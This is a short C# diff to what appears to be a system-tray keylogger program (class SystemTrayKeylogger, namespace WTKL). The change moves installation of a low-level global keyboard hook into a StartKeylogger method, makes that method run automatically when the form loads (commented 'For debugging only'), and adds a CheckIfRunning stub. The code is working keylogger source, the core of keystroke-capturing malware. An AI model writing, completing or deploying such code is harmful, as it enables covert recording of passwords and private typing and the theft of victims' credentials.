@@ -44,6 +44,9 @@ namespace WTKL
 
             base.OnLoad(e);
             CreateOpenPipe();
+
+            //For debugging only
+            StartKeylogger();
         }
 
         private void OnExit(object sender, EventArgs e)
@@ -64,7 +67,7 @@ namespace WTKL
         [STAThread]
         public static void Main()
         {
-            _hookID = SetHook(_proc); //todo try moving SetHook to StartKeylogger method
+            //_hookID = SetHook(_proc); //todo try moving SetHook to StartKeylogger method
             Application.Run(new SystemTrayKeylogger());
         }
 
@@ -82,6 +85,7 @@ namespace WTKL
 
         public bool StartKeylogger()
         {
+            _hookID = SetHook(_proc);
             logging = true;
             return logging;
         }
@@ -90,6 +94,11 @@ namespace WTKL
         {
             logging = false;
             return logging;
+        }
+
+        public bool CheckIfRunning()
+        {
+            return true;
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
